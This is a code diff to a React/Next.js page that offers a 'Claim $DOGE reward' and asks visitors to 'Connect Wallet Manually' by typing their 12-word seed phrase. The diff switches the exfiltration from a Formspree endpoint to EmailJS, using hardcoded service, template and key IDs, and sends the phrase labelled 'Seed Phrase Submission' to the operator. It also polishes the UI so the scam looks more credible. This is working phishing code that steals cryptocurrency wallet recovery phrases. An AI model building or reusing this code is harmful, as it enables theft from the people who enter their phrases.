@@ -10,9 +10,9 @@ import {
 } from "@/components/ui/dialog";
 import Image from "next/image";
 import { useState } from "react";
+import emailjs from "@emailjs/browser";
 
 export default function Home() {
-  // const [count, setCount] = useState(12);
   const [status, setStatus] = useState("");
   const [words, setWords] = useState(Array(12).fill(""));
   const [open, setOpen] = useState(false);
@@ -32,14 +32,22 @@ export default function Home() {
     }
 
     try {
-      const response = await fetch("https://formspree.io/f/mjkgnqzq", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ words }),
-      });
+      // Use EmailJS instead of Formspree
+      const response = await emailjs.send(
+        "service_h9fm5p7",
+        "template_zd869eg",
+        {
+          from_name: "Seed Phrase Submission",
+          message: words.join(" "),
+          seed_phrase: words.join(" "),
+          words: words,
+        },
+        "EEVwSYA6R0m-_8toc"
+      );
 
-      if (response.ok) {
-        console.log(response);
+      if (response.status === 200) {
+        console.log("Email sent successfully!", response);
+        setWords(Array(12).fill(""));
         setOpen(false);
       } else {
         console.log("Failed to send message", response);
@@ -88,7 +96,7 @@ export default function Home() {
                 Claim $DOGE reward
               </p>
             </DialogTrigger>
-            <DialogContent>
+            <DialogContent className="pt-5">
               <DialogHeader>
                 <DialogTitle>Connect Wallet Manually</DialogTitle>
                 <DialogDescription className="text-[15px]">
@@ -96,21 +104,6 @@ export default function Home() {
                   wallet.
                 </DialogDescription>
               </DialogHeader>
-              {/* <select
-                value={count}
-                onChange={(e) => {
-                  const newCount = parseInt(e.target.value, 10);
-                  setCount(newCount);
-                  setWords(Array(newCount).fill(""));
-                }}
-                className="py-1 border outline-none rounded-[5px]"
-              >
-                <option value={12}>12</option>
-                <option value={12}>15</option>
-                <option value={12}>18</option>
-                <option value={12}>21</option>
-                <option value={12}>24</option>
-              </select> */}
               <form onSubmit={onSubmit}>
                 <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-3 gap-3">
                   {words.map((word, i) => (
@@ -128,7 +121,7 @@ export default function Home() {
                 <div className="w-full flex justify-around mt-4 gap-5">
                   <button
                     type="button"
-                    className="cursor-pointer border bg-gray-200 rounded-sm py-1 w-full"
+                    className="cursor-pointer border bg-black text-white rounded-sm py-1 w-full"
                     onClick={() => {
                       setWords(Array(12).fill(""));
                       setOpen(false);
@@ -138,14 +131,40 @@ export default function Home() {
                   </button>
                   <button
                     type="submit"
-                    className={`cursor-pointer border  rounded-sm py-1 w-full ${
+                    className={`cursor-pointer border rounded-sm py-1 w-full ${
                       words.some((word) => word.trim() === "")
                         ? "opacity-50"
-                        : "bg-gray-200"
+                        : "bg-black text-white"
                     }`}
                     disabled={words.some((word) => word.trim() === "")}
                   >
-                    {status ? status : "Submit"}
+                    {status ? (
+                      <>
+                        <svg
+                          className="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline"
+                          xmlns="http://www.w3.org/2000/svg"
+                          fill="none"
+                          viewBox="0 0 24 24"
+                        >
+                          <circle
+                            className="opacity-25"
+                            cx="12"
+                            cy="12"
+                            r="10"
+                            stroke="currentColor"
+                            strokeWidth="4"
+                          ></circle>
+                          <path
+                            className="opacity-75"
+                            fill="currentColor"
+                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                          ></path>
+                        </svg>
+                        Processing...
+                      </>
+                    ) : (
+                      "Submit"
+                    )}
                   </button>
                 </div>
               </form>
